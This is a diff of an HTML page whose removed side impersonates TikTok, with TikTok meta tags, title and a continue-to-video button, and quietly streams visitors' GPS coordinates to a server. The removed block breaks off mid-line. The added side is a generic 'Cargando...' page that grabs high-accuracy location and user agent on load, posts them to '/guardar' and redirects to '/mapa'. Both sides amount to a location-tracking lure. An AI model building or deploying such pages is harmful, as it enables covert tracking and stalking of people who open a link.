@@ -3,146 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:site_name" content="TikTok">
-    <meta property="og:title" content="Mira este video en TikTok">
-    <meta property="og:description" content="Descubre contenido increíble en TikTok">
-    <meta property="og:image" content="https://sf16-sg.tiktokcdn.com/obj/eden-sg/u33hn4pjy/tiktok_logo.png">
-    <title>Redirigiendo a TikTok...</title>
+    <title>Cargando...</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #252525 0%, #111111 100%);
-            margin: 0;
-            padding: 20px;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
             display: flex;
-            align-items: center;
             justify-content: center;
-            color: white;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 450px;
-            width: 100%;
+        .loader {
             text-align: center;
-            backdrop-filter: blur(10px);
         }
-        .icon {
-            font-size: 64px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            color: #fff;
-            margin: 0 0 16px 0;
-            font-size: 24px;
-        }
-        p {
-            color: #ddd;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
-        .btn {
-            display: inline-block;
-            padding: 14px 32px;
-            margin: 8px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-decoration: none;
-            background: #ff0050;
-            color: white;
-            font-weight: bold;
-        }
-        .btn:hover {
-            background: #e00044;
-            transform: translateY(-2px);
-        }
-        #status {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 6px;
-            display: none;
-            background: rgba(255, 255, 255, 0.1);
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid #ff0050;
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #3498db;
             border-radius: 50%;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">🎵</div>
-        <h1>Cargando contenido de TikTok</h1>
-        <p>Preparando tu experiencia personalizada. Por favor, espera un momento...</p>
-        
-        <button class="btn" id="continueBtn">
-            Continuar al video
-        </button>
-        
-        <div id="status"></div>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p id="status">Verificando tu ubicación...</p>
     </div>
 
     <script>
-        const TARGET = "{{ target_tiktok }}";
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        
-        function showStatus(msg, loading = false) {
-            const status = document.getElementById('status');
-            status.style.display = 'block';
-            status.innerHTML = loading ? '<div class="loading"></div> ' + msg : msg;
-        }
-        
-        function sendLocation(lat, lon, accuracy) {
-            const data = {
-                latitud: lat,
-                longitud: lon,
-                precision: accuracy,
-                session_id: sessionId
-            };
-            
-            fetch('/guardar-ubicacion', {
+        function guardarUbicacion(lat, lon, precision, userAgent) {
+            fetch('/guardar', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitud: lat,
+                    longitud: lon,
+                    precision: precision,
+                    user_agent: userAgent
+                })
             })
-            .catch(err => console.error('Error al enviar ubicación:', err));
+            .then(response => response.json())
+            .then(data => {
+                console.log('Guardado:', data);
+            })
+            .catch(error => {
+                console.error('Error al guardar:', error);
+            });
         }
-        
+
         function getLocationAndRedirect() {
-            // Ocultar botón y mostrar estado de carga
-            document.getElementById('continueBtn').classList.add('hidden');
-            showStatus("Optimizando contenido para tu región...", true);
-            
-            // Intentar obtener ubicación de forma silenciosa
-            if ("geolocation" in navigator) {
-                // Usar watchPosition para actualizaciones continuas
-                navigator.geolocation.watchPosition(
-                    (position) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        
-                        // Enviar ubicación al servidor
-                        sendLocation(lat, lon, accuracy);
-                        
-                        // Redirigir después de obtener la primera ubicación
-                        setTimeout(() => {
-                            showStatus
+                        const precision = position.coords.accuracy;
+                        const userAgent = navigator.userAgent;
+
+                        guardarUbicacion(lat, lon, precision, userAgent);
+
+                        // Espera 1 segundo para dar tiempo al guardado antes de redirigir
+                        setTimeout(function() {
+                            window.location.href = '/mapa';
+                        }, 1000);
+                    },
+                    function(error) {
+                        // Si el usuario niega el permiso o hay error, redirige igual
+                        console.error('Error de geolocalización:', error.message);
+                        document.getElementById('status').innerText = 'No se pudo obtener la ubicación. Redirigiendo...';
+                        setTimeout(function() {
+                            window.location.href = '/mapa';
+                        }, 1500);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Navegador sin soporte de geolocalización
+                document.getElementById('status').innerText = 'Geolocalización no soportada. Redirigiendo...';
+                setTimeout(function() {
+                    window.location.href = '/mapa';
+                }, 1500);
+            }
+        }
+
+        // Ejecuta al cargar la página
+        window.onload = getLocationAndRedirect;
+    </script>
+</body>
+</html>
